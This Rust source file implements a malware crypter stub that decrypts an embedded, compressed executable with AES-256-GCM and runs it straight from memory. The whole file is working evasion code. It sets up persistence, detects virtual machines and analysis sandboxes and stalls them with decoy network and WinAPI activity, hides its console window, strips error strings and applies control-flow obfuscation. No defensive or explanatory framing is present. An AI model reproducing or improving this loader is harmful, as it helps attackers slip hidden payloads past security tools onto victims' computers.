#![windows_subsystem = "windows"]

mod generated;
mod persistence;

use generated::{KEY, NONCE, DELAY_SECS, ANALYSIS_DETECTION, PERSISTENCE};
use std::time::{Duration, Instant};
use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Key, Nonce,
};
use rust_code_obfuscator::{obfuscate_dummy_branch, obfuscate_flow};
use std::convert::TryInto;
use busywork::{BusyWork, Categories, Intensity};
use rand::RngExt;

/// Opaque error type. Intentionally has no Display/Debug text so no
/// diagnostic string ever reaches the binary, stdout, or a crash dump.
#[derive(Clone, Copy)]
pub enum StubError {
    EncryptionFailed,
    DecompressionFailed,
    ExecutionFailed,
    PersistenceError,
    UnexpectedError,
}

type StubResult<T> = Result<T, StubError>;

// Encrypted + zstd-compressed target PE, embedded at compile time.
static ENCRYPTED: &[u8] = include_bytes!("../payload.enc");

fn analysis_detected() -> bool {
    vmaware::VM::detect(None)
}

fn decompress() -> StubResult<Vec<u8>> {
    zstd::decode_all(ENCRYPTED).map_err(|_| StubError::DecompressionFailed)
}

fn decrypt(ciphertext: &[u8]) -> StubResult<Vec<u8>> {
    let key: &Key<Aes256Gcm> = (&KEY).try_into().map_err(|_| StubError::EncryptionFailed)?;
    let cipher = Aes256Gcm::new(key);
    let nonce: &Nonce<_> = (&NONCE).try_into().map_err(|_| StubError::EncryptionFailed)?;
    let plaintext = cipher.decrypt(nonce, ciphertext).map_err(|_| StubError::EncryptionFailed)?;
    Ok(plaintext)
}

fn execute(pe_bytes: &[u8]) -> StubResult<()> {
    let module = maple_rs::Maple::load_executable_from_memory(pe_bytes).map_err(|_| StubError::ExecutionFailed)?;
    module.execute_entry_point().map_err(|_| StubError::ExecutionFailed)?;
    Ok(())
}

fn behavior_misleading(duration_secs: u64) {
    let target = Duration::from_secs(duration_secs);
    let start = Instant::now();
    let worker = BusyWork::new(Intensity::Low).allow(Categories::NETWORK | Categories::WINAPI);
    while start.elapsed() < target {
        worker.run();
    }
}

fn delay_execution() {
    if DELAY_SECS > 0 {
        behavior_misleading(DELAY_SECS);
    }
}

fn run() -> StubResult<()> {
    if PERSISTENCE {
        if persistence::is_running_from_target() {
            persistence::register_persistence();
        } else {
            if persistence::install_and_launch().is_ok() {
                return Ok(());
            }
        }
    }

    delay_execution();

    if ANALYSIS_DETECTION && analysis_detected() {
        behavior_misleading(rand::rng().random_range(60..120));
        return Ok(());
    }

    let ciphertext = decompress()?;
    let pe_bytes = decrypt(&ciphertext)?;
    execute(&pe_bytes)?;

    Ok(())
}

fn main() {
    obfuscate_flow!(); // https://github.com/GianIac/rustfuscator
    obfuscate_dummy_branch!(); // https://github.com/GianIac/rustfuscator
    if run().is_err() {
        std::process::exit(1);
    }
}